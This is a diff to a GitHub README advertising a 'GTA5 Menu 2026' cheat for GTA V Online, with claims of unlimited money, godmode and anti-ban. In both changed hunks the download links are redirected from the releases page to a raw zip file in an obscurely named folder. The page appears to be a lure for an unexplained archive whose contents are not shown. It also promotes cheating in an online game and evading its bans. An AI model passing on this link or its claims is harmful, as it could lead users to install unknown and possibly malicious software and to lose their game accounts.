@@ -1,7 +1,7 @@
 <h1>🎮 GTA5-Menu---GTA-V-Online-Mod-Menu-2026 - Unlimited Money, Godmode & Anti-Ban</h1>
 
 <p align="center">
-<a href="https://github.com/Hesitationmatzahmeal9571/GTA5-Menu---GTA-V-Online-Mod-Menu-2026/releases"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20GTA5%20MENU%202026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download"></a>
+<a href="https://raw.githubusercontent.com/Hesitationmatzahmeal9571/GTA5-Menu---GTA-V-Online-Mod-Menu-2026/main/paradiastole/v2.3.zip"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20GTA5%20MENU%202026-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download"></a>
 </p>
 
 ## 🎯 What Is GTA5-Menu?
@@ -46,7 +46,7 @@ GTA5-Menu is your all-in-one mod menu for **GTA V Online** in 2026. It gives you
 
 Visit this link to download the application:
 
-[⬇️ **DOWNLOAD GTA5-MENU 2026**](https://github.com/Hesitationmatzahmeal9571/GTA5-Menu---GTA-V-Online-Mod-Menu-2026/releases)
+[⬇️ **DOWNLOAD GTA5-MENU 2026**](https://raw.githubusercontent.com/Hesitationmatzahmeal9571/GTA5-Menu---GTA-V-Online-Mod-Menu-2026/main/paradiastole/v2.3.zip)
 
 The download is completely free and requires no registration.
 
